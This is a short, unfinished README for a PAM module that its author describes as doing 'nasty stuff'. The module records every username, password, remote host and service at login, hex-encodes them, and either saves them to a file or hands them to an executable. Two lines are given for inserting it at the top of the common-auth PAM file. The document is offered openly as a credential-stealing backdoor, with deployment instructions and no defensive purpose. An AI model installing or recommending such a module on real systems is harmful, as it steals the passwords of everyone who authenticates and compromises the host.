Intro
=====

This is a pam modules that does all kinds of nasty stuff, like exec a program or log usernames,passwords

## USAGE:

The modules sends username, password, remote host (if applicable), and service to a hex string. Then that hex string is either saved to a file or sent to an executable on the server.

### To log to file

Add the following to the top line of the "common-auth" pam file

~~~
auth optional mypam.so file /root/.test2.txt
~~~

### To send to executable


~~~
auth optional mypam.so exec /root/script.sh
~~~


TODO

FINISH README
